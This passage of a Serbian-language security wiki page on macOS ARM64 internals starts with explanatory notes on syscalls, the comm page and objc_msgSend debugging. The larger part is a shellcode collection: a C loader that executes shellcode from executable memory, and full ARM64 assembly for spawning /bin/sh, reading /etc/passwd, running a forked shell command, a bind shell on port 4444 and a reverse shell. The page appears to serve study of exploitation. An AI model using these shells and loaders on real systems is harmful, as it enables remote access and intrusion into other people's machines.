> Ponekad je lakše proveriti **decompiled** kod iz **`libsystem_kernel.dylib`** nego proveravati **source code**, jer se kod nekoliko syscall-ova (BSD i Mach) generiše putem skripti (pogledajte komentare u source code-u), dok u dylib-u možete pronaći šta se poziva.

### machdep pozivi

XNU podržava još jedan tip poziva koji se nazivaju machine dependent. Brojevi ovih poziva zavise od arhitekture i nije garantovano da će sami pozivi ili njihovi brojevi ostati konstantni.

### comm page

Ovo je kernel memorijska stranica koja je mapirana u adresni prostor svakog users procesa. Namenjena je tome da prelazak iz user mode-a u kernel space bude brži nego pri korišćenju syscall-ova za kernel servise koji se toliko često koriste da bi ovaj prelazak bio veoma neefikasan.

Na primer, poziv `gettimeofdate` direktno čita vrednost `timeval` sa comm page-a.

### objc_msgSend

Veoma je uobičajeno pronaći ovu funkciju u Objective-C ili Swift programima. Ova funkcija omogućava pozivanje metode Objective-C objekta.

Parametri ([više informacija u dokumentaciji](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Pokazivač na instancu
- x1: op -> Selector metode
- x2... -> Preostali argumenti pozvane metode

Dakle, ako postavite breakpoint pre branch-a ka ovoj funkciji, u lldb-u možete lako utvrditi šta se poziva (u ovom primeru objekat poziva objekat iz `NSConcreteTask` koji će pokrenuti komandu):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Postavljanjem env promenljive **`NSObjCMessageLoggingEnabled=1`** moguće je logovati kada se ova funkcija pozove u fajl kao što je `/tmp/msgSends-pid`.
>
> Takođe, postavljanjem **`OBJC_HELP=1`** i pozivanjem bilo kog binary-ja možete videti druge environment variables koje možete koristiti za **logovanje** trenutka kada se dese određene Objc-C radnje.

Kada se ova funkcija pozove, potrebno je pronaći pozvani metod navedene instance; u tu svrhu obavljaju se različite pretrage:

- Izvršiti optimistic cache lookup:
- Ako je uspešno, završiti
- Preuzeti runtimeLock (read)
- Ako je (realize && !cls->realized), realize class
- Ako je (initialize && !cls->initialized), initialize class
- Pokušati sa sopstvenim cache-om klase:
- Ako je uspešno, završiti
- Pokušati sa listom metoda klase:
- Ako je pronađena, popuniti cache i završiti
- Pokušati sa cache-om superclass:
- Ako je uspešno, završiti
- Pokušati sa listom metoda superclass:
- Ako je pronađena, popuniti cache i završiti
- Ako je (resolver), pokušati sa method resolver-om i ponoviti od class lookup
- Ako smo i dalje ovde (= sve ostalo nije uspelo), pokušati sa forwarder-om

### Shellcodes

Za kompajliranje:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Za izdvajanje bajtova:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Za novije verzije macOS-a:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C kod za testiranje shellcode-a</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Preuzeto [**odavde**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) i objašnjeno.<sup>[1]</sup>

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Čitanje pomoću cat

Cilj je izvršiti `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`, tako da je drugi argument (x1) niz parametara (što u memoriji predstavlja stek adresa).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Pozivanje komande pomoću sh iz fork-a kako glavni proces ne bi bio prekinut
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell sa [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) na **portu 4444**<sup>[2]</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Sa [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell ka **127.0.0.1:4444**<sup>[3]</sup>.
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
## Reference

- [1] [daem0nc0re/macOS_ARM64_Shellcode - shell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)
- [2] [daem0nc0re/macOS_ARM64_Shellcode - bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s)
- [3] [daem0nc0re/macOS_ARM64_Shellcode - reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s)

{{#include ../../../banners/hacktricks-training.md}}
